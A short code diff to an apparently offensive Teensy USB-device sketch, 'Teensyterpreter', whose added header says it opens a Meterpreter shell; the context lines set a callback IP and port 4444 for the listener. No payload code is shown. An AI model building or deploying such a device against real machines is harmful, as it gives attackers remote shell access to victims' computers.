@@ -1,3 +1,11 @@
+/*
+Teensyterpreter - By KernelEquinox
+Modified and upgraded by ThePlasmaRailgun
+Opens a meterpreter shell using Teensy 2.0
+Or above
+See readme.md
+*/
+
 // Replace the two variables below.
 int ip[] = {192,168,1,1};
 int port = 4444;
